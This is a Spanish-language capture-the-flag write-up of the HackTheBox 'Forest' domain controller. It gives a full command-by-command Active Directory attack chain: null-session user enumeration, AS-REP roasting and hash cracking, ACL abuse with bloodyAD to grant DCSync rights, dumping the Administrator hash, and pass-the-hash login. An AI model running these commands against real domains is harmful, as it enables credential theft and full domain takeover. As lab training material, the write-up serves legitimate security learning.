Forest — HackTheBox
SO: Windows Server 2016 (Domain Controller)
Dominio: htb.local
Dificultad: Easy
Resumen: Enumeración anónima → AS-REP Roast → abuso de ACLs (Account Operators → Exchange Windows Permissions → WriteDACL) → DCSync → Pass-the-Hash.
Enumeración
bash
nmap -sVC -p- 10.129.X.X

Puertos relevantes: 53 (DNS), 88 (Kerberos), 389/3268 (LDAP), 445 (SMB), 5985 (WinRM). Es un Controlador de Dominio.

Del smb-os-discovery se obtiene el dominio y el FQDN:

bash
echo "10.129.X.X htb.local forest.htb.local FOREST" | sudo tee -a /etc/hosts
Foothold — AS-REP Roast

El DC permite sesión nula, así que se puede enumerar la lista de usuarios sin credenciales.

bash
nxc smb 10.129.X.X -u '' -p '' --users
rpcclient -U '' -N 10.129.X.X -c enumdomusers | grep -oP 'user:\[\K[^]]+' > users.txt

Entre los usuarios aparece la cuenta de servicio svc-alfresco.

Se lanza AS-REP Roast contra toda la lista. El DC solo devuelve ticket de las cuentas con la preautenticación de Kerberos desactivada:

bash
impacket-GetNPUsers htb.local/ -usersfile users.txt -no-pass -dc-ip 10.129.X.X 2>/dev/null | grep krb5asrep > asrep.txt

Únicamente svc-alfresco devuelve hash. Se crackea offline:

bash
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

Credenciales obtenidas: svc-alfresco:s3rvice.

Acceso por WinRM y lectura de la flag de usuario:

bash
evil-winrm -i 10.129.X.X -u svc-alfresco -p 's3rvice'
type C:\Users\svc-alfresco\Desktop\user.txt
Escalada de privilegios — Abuso de ACLs → DCSync
Descubrimiento del camino (BloodHound)

Recolección de datos del dominio con las credenciales ya obtenidas:

bash
pipx install bloodhound-ce
bloodhound-ce-python -u svc-alfresco -p 's3rvice' -d htb.local -ns 10.129.X.X -c All --zip

Se arranca BloodHound CE y se importa el .zip:

bash
bloodhound-start        # GUI en http://localhost:8080

Si PostgreSQL falla por desajuste de collation:

bash
sudo -u postgres psql -c "ALTER DATABASE template1 REFRESH COLLATION VERSION;"
sudo -u postgres psql -c "ALTER DATABASE postgres  REFRESH COLLATION VERSION;"

Marcando svc-alfresco como Owned y haciendo Pathfinding hasta DOMAIN ADMINS, el grafo muestra el camino:

svc-alfresco --MemberOf--> ACCOUNT OPERATORS
             --GenericAll--> EXCHANGE WINDOWS PERMISSIONS
             --WriteDacl--> HTB.LOCAL (dominio)
             --> DCSync
Account Operators puede modificar la membresía del grupo Exchange Windows Permissions (GenericAll).
Exchange Windows Permissions tiene WriteDACL sobre el objeto del dominio, lo que permite concederse a uno mismo derechos de DCSync.
Explotación

La máquina revierte la membresía de grupo a los pocos segundos, por lo que los dos pasos y el volcado se encadenan para que el ACE de DCSync (permanente) se grabe antes de la reversión:

bash
pipx install bloodyAD

bloodyAD -u svc-alfresco -p 's3rvice' -d htb.local --host 10.129.X.X add groupMember "Exchange Windows Permissions" svc-alfresco && \
bloodyAD -u svc-alfresco -p 's3rvice' -d htb.local --host 10.129.X.X add dcsync svc-alfresco && \
impacket-secretsdump htb.local/svc-alfresco:'s3rvice'@10.129.X.X

El volcado por DCSync entrega el hash NT del Administrator:

htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Pass-the-Hash → root
bash
evil-winrm -i 10.129.X.X -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
type C:\Users\Administrator\Desktop\root.txt
Notas
El orden es obligatorio: primero entrar al grupo, después concederse DCSync. Si se intenta el DCSync sin pertenecer al grupo, el DC responde insufficientAccessRights.
La membresía de grupo se revierte automáticamente; de ahí el encadenado con &&.
El ACE de DCSync persiste sobre la cuenta aunque después se pierda la pertenencia al grupo.
BloodHound no ejecuta el ataque: descubre la ruta y aporta los comandos de abuso. La ejecución se hace con bloodyAD / impacket.
Técnicas
Enumeración anónima de AD (sesión nula / RID).
AS-REP Roasting (UF_DONT_REQUIRE_PREAUTH, hashcat -m 18200).
Análisis de rutas de ataque con BloodHound.
Abuso de ACLs: GenericAll sobre grupo + WriteDACL sobre dominio.
DCSync (secretsdump) y Pass-the-Hash.
